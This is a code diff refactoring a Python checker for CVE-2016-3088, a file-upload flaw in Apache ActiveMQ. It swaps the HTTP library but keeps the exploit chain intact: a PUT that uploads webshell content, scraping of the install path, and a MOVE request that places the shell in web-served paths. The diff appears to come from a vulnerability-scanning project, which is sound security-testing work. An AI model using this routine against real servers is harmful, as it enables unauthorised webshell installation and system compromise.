@@ -8,9 +8,7 @@ description: CVE-2016-3088漏洞可上传文件,上传shell需要账号密码,�
 import re
 import time
 import base64
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class CVE_2016_3088_BaseVerify:
     def __init__(self, url):
@@ -67,7 +65,7 @@ class CVE_2016_3088_BaseVerify:
     def checkfile(self, file_path):
         try:
             print("[+]Trying PUT.." + self.put_file_path)
-            req = requests.get(file_path, headers = self.headers, allow_redirects = False, verify=False)
+            req = request.get(file_path, headers = self.headers)
             if req.status_code == 200 or req.status_code != 404:
                 return True
             else:
@@ -98,7 +96,7 @@ class CVE_2016_3088_BaseVerify:
         self.init_shell_fie()
         self.put_file_path = self.url + self.put_file_path
         check_url = self.put_file_path
-        put_req = requests.put(self.put_file_path, headers = self.headers, data = self.webshell_content, allow_redirects = False, verify = False)
+        put_req = request.put(self.put_file_path, headers = self.headers, data = self.webshell_content)
         time.sleep(2)
         if (self.checkfile(self.put_file_path)):
             print("存在CVE-2016-3088漏洞")
@@ -108,7 +106,7 @@ class CVE_2016_3088_BaseVerify:
             for get_install_path_url in self.get_install_path_url:
                 get_install_path_url = self.url + get_install_path_url
                 try:
-                    get_install_path_req = requests.get(get_install_path_url, headers = self.headers, allow_redirects = False, verify = False)
+                    get_install_path_req = request.get(get_install_path_url, headers = self.headers)
                     pattern = re.compile('<td class="label">.*?</td>.|\\n*<td>(.*)</td>')
                     deal_path = pattern.findall(get_install_path_req.text)
                     tempIndex = self.deal_path(deal_path[13])
@@ -134,7 +132,7 @@ class CVE_2016_3088_BaseVerify:
             for webshell_path in self.webshell_path_list:
                 self.move_shell_path = temp_shell_path + webshell_path
                 self.headers['Destination'] = self.move_shell_path
-                move_file_req = requests.request('MOVE', self.put_file_path, headers = self.headers, allow_redirects = False, verify = False)
+                move_file_req = request.request('MOVE', self.put_file_path, headers = self.headers)
                 web_shell = self.url + webshell_path
                 if (self.checkfile(web_shell)):
                     print("上传shell成功,路径为", web_shell)
